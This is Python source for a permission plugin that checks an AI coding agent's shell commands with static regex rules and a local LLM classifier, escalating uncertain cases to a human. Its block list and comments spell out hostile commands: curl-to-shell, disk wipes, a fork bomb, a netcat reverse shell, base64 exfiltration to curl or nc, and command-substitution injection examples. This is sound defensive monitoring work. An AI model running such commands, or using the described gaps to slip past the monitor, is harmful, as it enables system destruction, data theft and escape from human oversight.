"""hermes-classifier-mode — Claude Code `auto` permission mode for Hermes Agent.

A `pre_tool_call` plugin that routes shell commands through a local LLM
classifier (Ollama by default) before they execute, mirroring Claude Code's
`--permission-mode auto`: autonomy with a second model judging each action,
instead of "ask me every time" or "skip all checks".

Verdicts:
  allow   -> command proceeds (None returned to the hook dispatcher)
  block   -> command vetoed; the model sees the classifier's reason
  approve -> escalated to the existing human approval gate
             ([o]nce/[s]ession/[a]lways/[d]eny) — fail-closed

Fast paths so the common case never pays model latency:
  1. Static instant-allow: single read-only commands (git status, ls, cat, ...)
  2. Static instant-block: high-precision catastrophic patterns
     (fork bombs, curl|sh, disk wipes) — works even with Ollama down
  3. Local classifier for everything else
  4. Classifier unreachable/unparseable -> escalate to human (never fail-open)

Verdict determinism: classifier requests pin a sampling seed derived from the
command text (stable across restarts), and successful verdicts are cached per
(model, command). The same command therefore always gets the same verdict —
temperature 0 alone does not stop the model from inventing a different
free-form "reason" on every call.

Configuration lives in config.yaml under `classifier_mode:` (settings, never
secrets). Defaults work with zero config when Ollama runs on :11434.
"""

from __future__ import annotations

import hashlib
import json
import logging
import re
import time
import urllib.error
import urllib.request
from collections import OrderedDict
from typing import Any, Dict, Optional

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Configuration (config.yaml: classifier_mode section)
# ---------------------------------------------------------------------------

_DEFAULTS: Dict[str, Any] = {
    "enabled": True,
    "ollama_url": "http://localhost:11434",
    "model": "hf.co/ornith-ai/Ornith-1.5-35B-A3B-GGUF:Q5_K_M",
    "timeout_s": 20,
    # How long Ollama keeps the model warm between verdicts (seconds).
    "keep_alive_s": 600,
    # How long a cached verdict is reused for the same (model, command)
    # (seconds). 0 disables the cache. Keeps repeated commands both fast and
    # identically answered.
    "verdict_cache_s": 86400,
    # Deny rule that overrides the classifier: force human approval.
    # Entries are regexes matched against the command string.
    "force_approve_patterns": [],
    # Allow rules that override everything below (checked before both the
    # static rules and the model). Seeded from the 2026-09-01 incident where
    # benign Hermes admin/model-pin commands were blocked with hallucinated
    # rationales. Each entry is fully anchored to one benign command shape —
    # keep new ones that narrow. NOTE: setting force_allow_patterns in
    # config.yaml REPLACES this default list, so copy these entries when
    # extending (see README).
    "force_allow_patterns": [
        # Pin a kanban task's delegation model to the sanctioned Sol seat.
        r"^hermes kanban set-model --provider openai-codex [A-Za-z0-9._:-]+ gpt-5\.6-sol$",
        # The two benign delegation-seat config assignments (nothing else).
        r"^hermes config set delegation\.provider openai-codex$",
        r"^hermes config set delegation\.model gpt-5\.6-sol$",
        # Read-only cron inspection forms (never mutate).
        r"^hermes cron (?:list|status|runs|doctor)(?:\s.*)?$",
        # Cron model-pin edits only, in either flag order.
        r"^hermes cron edit [A-Za-z0-9._:-]+ (?:(?:--provider openai-codex)(?: --model gpt-5\.6-sol)?|(?:--model gpt-5\.6-sol)(?: --provider openai-codex)?)$",
    ],
}


def _load_config() -> Dict[str, Any]:
    cfg = dict(_DEFAULTS)
    try:
        from hermes_cli.config import load_config

        raw = load_config() or {}
        section = raw.get("classifier_mode")
        if isinstance(section, dict):
            cfg.update({k: v for k, v in section.items() if v is not None})
    except Exception as e:  # config unavailable -> defaults
        logger.debug("classifier-mode: config load failed, using defaults: %s", e)
    return cfg


# ---------------------------------------------------------------------------
# Fast path 1: static read-only allow
# ---------------------------------------------------------------------------

# Single-command, pipe/redirection-free read-only invocations. Matched as the
# WHOLE command (after stripping env-var prefixes) against `^<word>( .*)?$`.
_READ_ONLY = {
    # vcs
    "git status", "git log", "git show", "git diff", "git branch",
    "git remote", "git blame", "git describe", "git rev-parse",
    "git ls-files", "git ls-remote", "git config --get",
    # inspection
    "ls", "cat", "head", "tail", "wc", "file", "stat", "du", "df",
    "which", "whereis", "whoami", "hostname", "date", "uname", "env",
    "printenv", "pwd", "tree", "find", "locate", "mdfind",
    # dev tools (read invocations)
    "cargo check", "cargo metadata", "cargo tree", "cargo doc --no-deps",
    "python --version", "python3 --version", "node --version",
    "npm ls", "npm view", "rustc --version", "go version", "uv --version",
    "ollama list", "hermes status", "hermes doctor",
}

_READ_ONLY_RE = re.compile(
    r"^(?:[A-Za-z_][A-Za-z0-9_]*=\S*\s+)*("  # optional FOO=bar env prefixes
    + "|".join(re.escape(c) for c in sorted(_READ_ONLY, key=len, reverse=True))
    + r")(?=\s|$)"
)


def _static_allow(command: str) -> bool:
    """True for unambiguous single read-only commands (no pipes/redirects/
    substitution/other shell operators)."""
    if any(ch in command for ch in "|;&`$><\n"):
        return False
    return bool(_READ_ONLY_RE.match(command.strip()))


# ---------------------------------------------------------------------------
# Fast path 2: static catastrophic block (high precision, defense-in-depth)
# ---------------------------------------------------------------------------

_STATIC_BLOCK_RES = [
    # remote code execution
    re.compile(r"curl[^|]*\|\s*(ba)?sh\b"),
    re.compile(r"wget[^|]*\|\s*(ba)?sh\b"),
    re.compile(r"curl[^|]*\|\s*python3?\b"),
    # disk destruction
    re.compile(r"\bmkfs(\.\w+)?\b"),
    re.compile(r"\bdd\b[^\n]*\bof=/dev/(sd|nvme|disk)"),
    re.compile(r"rm\s+(-[a-zA-Z]*[rf][a-zA-Z]*\s+)+/(\s|$)"),
    re.compile(r"--no-preserve-root"),
    # fork bomb
    re.compile(r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:"),
    # persistence / credential sweeping
    re.compile(r"\bcrontab\b[^\n]*\|\s*"),  # piping into crontab
    re.compile(r"\bchflags\s+hidden\b"),
    re.compile(r"defaults\s+write\s+com\.apple\.loginwindow\b"),
    #常见 exfil one-liner: base64 blob piped to a network send
    re.compile(r"base64\b[^|\n]*\|\s*(curl|wget|nc|ssh)\b"),
    re.compile(r"\bnc\b[^|\n]*-e\s*/bin/(ba)?sh"),
]


def _unquoted(command: str) -> str:
    """Remove quoted segments ('…' and "…") — a curl|sh inside an echo string
    literal is data, not an execution."""
    return re.sub(r"'[^']*'|\"[^\"]*\"", '""', command)


# Command substitution is executable even inside double quotes ($(...),
# ${...}, and `...` all run in either quoting context — single quotes are the
# only inert shell), so its presence disqualifies a command from force_allow
# regardless of where it appears.
_CMD_SUBSTITUTION = re.compile(r"`|\$\(|\$\{")


def _static_block(command: str) -> Optional[str]:
    bare = _unquoted(command)
    for rx in _STATIC_BLOCK_RES:
        m = rx.search(bare)
        if m:
            return f"matched static dangerous pattern ({m.group(0)[:40]!r})"
    return None


# ---------------------------------------------------------------------------
# Fast path 3: config-driven overrides
# ---------------------------------------------------------------------------


def _compile_res(patterns) -> list:
    out = []
    for p in patterns or []:
        try:
            out.append(re.compile(p))
        except re.error:
            logger.warning("classifier-mode: bad regex in config: %r", p)
    return out


def _overrides(cfg, command):
    # force_allow honors only operator-free commands: shell operators outside
    # quotes (a pattern with a permissive tail like `(?:\s.*)?` must not be
    # satisfiable by appending `&& rm -rf /` or ` ; curl evil | sh`), and —
    # checked on the ORIGINAL text, since quoting is not a shell-safe
    # boundary — any command substitution: `...`, $(...), ${...} all execute
    # inside double quotes, so `hermes cron status "$(curl … | sh)"` must not
    # hit the built-in `hermes cron` pattern. Disqualified commands fall
    # through to the normal layers — this only ever adds scrutiny, never
    # removes it.
    if (
        not re.search(r"[|;&`$><\n]", _unquoted(command))
        and not _CMD_SUBSTITUTION.search(command)
    ):
        for rx in _compile_res(cfg["force_allow_patterns"]):
            if rx.search(command):
                return "allow"
    for rx in _compile_res(cfg["force_approve_patterns"]):
        if rx.search(command):
            return "approve"
    return None


# ---------------------------------------------------------------------------
# LLM classifier (Ollama)
# ---------------------------------------------------------------------------

_SYSTEM_PROMPT = """You are the security classifier for an AI coding agent's shell commands. The agent works on the user's local projects: writing code, running builds and tests, using git, and inspecting files.

Classify the command. Reply with ONLY a JSON object:
{"verdict":"allow"|"block","reason":"<max 15 words>","alternative":"<max 20 words>"}

On BLOCK, "alternative" is REQUIRED: a concrete safer way to achieve the same goal without the flagged risk (e.g. a scoped variant, a tool's official cleanup subcommand, a temp-directory path). If no safer equivalent exists, use "ask-user". On ALLOW, use "".

BLOCK (verdict "block"): data exfiltration (sending files/secrets/env vars to remote hosts); destructive operations (mass deletion, disk wiping, overwriting outside the project); persistence mechanisms (crontab, launchd, shell profiles); credential access (ssh keys, ~/.aws, browser cookies); disabling security controls; anything encoding/obfuscating its true effect (base64/hex/eval layers hiding the payload); commands inconsistent with normal software development.

ALLOW (verdict "allow"): builds, tests, linters, formatters, package managers (npm/pip/cargo/brew installs), git operations (including commit/push), file inspection, text processing, local scripts inside the project, starting dev servers.

When genuinely ambiguous, choose the less destructive reading. Never invent fields. Reason must be plain text."""


# Verdict cache: (model, command) -> (verdict dict, monotonic time). Re-running
# the same command must not elicit a fresh free-form "reason" each call —
# temperature 0 alone leaves Ollama's sampling unpinned, which is how one
# benign kanban pin drew five different hallucinated rationales (2026-09-01).
_VERDICT_CACHE: "OrderedDict[Any, Any]" = OrderedDict()
_VERDICT_CACHE_MAX = 512


def _command_seed(command: str) -> int:
    """Sampling seed derived from the command text, identical for identical
    commands across processes and restarts. Must not be builtin hash(): string
    hashing is process-randomized, so the seed would change every restart."""
    digest = hashlib.sha256(command.encode("utf-8")).digest()
    return int.from_bytes(digest[:4], "big") or 1  # Ollama treats seed 0 as random


def _cache_get(key, ttl_s: int) -> Optional[Dict[str, Any]]:
    entry = _VERDICT_CACHE.get(key)
    if entry is None:
        return None
    verdict, at = entry
    if ttl_s <= 0 or time.monotonic() - at > ttl_s:
        _VERDICT_CACHE.pop(key, None)
        return None
    return dict(verdict)


def _cache_put(key, verdict: Dict[str, Any]) -> None:
    _VERDICT_CACHE[key] = (dict(verdict), time.monotonic())
    while len(_VERDICT_CACHE) > _VERDICT_CACHE_MAX:
        _VERDICT_CACHE.popitem(last=False)  # evict oldest-inserted


def _ollama_classify(cfg: Dict[str, Any], command: str) -> Optional[Dict[str, Any]]:
    """Call the local model. Returns parsed verdict dict or None on any failure
    (unreachable, timeout, unparseable) — caller fails closed to human gate.
    Successes are served from/stored in the verdict cache; failures are not
    cached (a transient Ollama outage must not pin a stale answer)."""
    cache_key = (cfg["model"], command)
    ttl_s = int(cfg.get("verdict_cache_s") or 0)
    hit = _cache_get(cache_key, ttl_s)
    if hit is not None:
        return hit
    body = json.dumps({
        "model": cfg["model"],
        "messages": [
            {"role": "system", "content": _SYSTEM_PROMPT},
            {"role": "user", "content": f"Command: {command}"},
        ],
        "stream": False,
        "format": "json",
        "think": False,
        "keep_alive": cfg["keep_alive_s"],
        "options": {"temperature": 0, "num_predict": 120,
                    "seed": _command_seed(command)},
    }).encode()
    req = urllib.request.Request(
        cfg["ollama_url"].rstrip("/") + "/api/chat",
        data=body,
        headers={"Content-Type": "application/json"},
    )
    try:
        with urllib.request.urlopen(req, timeout=cfg["timeout_s"]) as resp:
            out = json.load(resp)
        content = str(out["message"]["content"]).strip()
        # Some models wrap JSON in a markdown code fence — strip it.
        if content.startswith("```"):
            content = content.strip("`")
            if content.lower().startswith("json"):
                content = content[4:]
            content = content.strip()
        verdict = json.loads(content)
        v = str(verdict.get("verdict", "")).lower()
        if v in ("allow", "block"):
            alt = str(verdict.get("alternative", "")).strip()[:200]
            out_verdict = {
                "verdict": v,
                "reason": str(verdict.get("reason", ""))[:200],
                "alternative": alt if v == "block" else "",
            }
            _cache_put(cache_key, out_verdict)
            return out_verdict
        return None
    except (urllib.error.URLError, TimeoutError, KeyError, json.JSONDecodeError,
            OSError, ValueError) as e:
        logger.warning("classifier-mode: classifier unavailable: %s", e)
        return None


# ---------------------------------------------------------------------------
# Hook
# ---------------------------------------------------------------------------

_scope = {"busy": False}  # re-entrancy guard: never classify our own commands


def _on_pre_tool_call(
    tool_name: str = "",
    args: Any = None,
    **_: Any,
) -> Optional[Dict[str, str]]:
    cfg = _load_config()
    if not cfg.get("enabled"):
        return None
    if tool_name not in ("terminal", "execute_code") or _scope["busy"]:
        return None

    command = ""
    if isinstance(args, dict):
        command = str(args.get("command") or "")
        if tool_name == "execute_code" and not command.strip():
            # execute_code passes the script in `code`, not `command`. Feed the
            # actual script text to the classifier, labeled so the model knows
            # what shape of payload it is judging.
            code = str(args.get("code") or "")
            if code.strip():
                command = "[execute_code: Python script about to run]\n" + code
    if not command.strip():
        return None

    # Config overrides first (force_allow beats force_approve).
    forced = _overrides(cfg, command)
    if forced == "allow":
        return None
    if forced == "approve":
        return {
            "action": "approve",
            "message": f"classifier_mode force_approve rule matched: {command[:120]}",
            "rule_key": "classifier_mode:force_approve",
        }

    # Fast path: static allow.
    if _static_allow(command):
        return None

    # Fast path: static block (defense-in-depth, works with Ollama down).
    why = _static_block(command)
    if why:
        return {
            "action": "block",
            "message": (
                f"BLOCKED by classifier_mode static rule: {why}. This "
                "pattern is refused by default, not unconditionally: "
                "classifier_mode.force_allow_patterns is checked BEFORE the "
                "static rules, so a narrowly anchored regex matching this "
                "exact command shape in config.yaml overrides this block. If "
                "it is genuinely needed, ask the user to add that exception "
                "or run the command themselves outside the agent."
            ),
        }

    # LLM classifier path.
    _scope["busy"] = True
    try:
        verdict = _ollama_classify(cfg, command)
    finally:
        _scope["busy"] = False

    if verdict is None:
        # Fail closed — but to a HUMAN, not to a block. If no human is
        # present (cron/-q), Hermes' approval gate itself fails closed.
        return {
            "action": "approve",
            "message": (
                f"classifier_mode could not reach the local classifier "
                f"({cfg['model']} at {cfg['ollama_url']}). Command needs human "
                f"approval: {command[:150]}"
            ),
            "rule_key": "classifier_mode:human_fallback",
        }

    if verdict["verdict"] == "allow":
        logger.info("classifier-mode: ALLOW %r (%s)", command[:80], verdict["reason"])
        return None

    alt = verdict.get("alternative", "")
    guidance = (
        f" If the user explicitly asked for this exact action, tell them and ask"
        f" how to proceed — they can add a force_allow pattern in config.yaml"
        f" (classifier_mode section)."
    )
    if alt and alt.lower() != "ask-user":
        guidance = (
            f" Safer alternative that achieves the same goal: {alt}. Propose or"
            f" execute that instead — it will pass through this same classifier."
        )
    elif alt == "ask-user":
        guidance = (
            " No safer equivalent exists; present the risk to the user and ask"
            " how to proceed before attempting anything similar."
        )
    return {
        "action": "block",
        "message": (
            f"BLOCKED by classifier_mode ({cfg['model']}): {verdict['reason']}. "
            f"Command: {command[:150]}.{guidance}"
        ),
    }


def register(ctx) -> None:
    ctx.register_hook("pre_tool_call", _on_pre_tool_call)
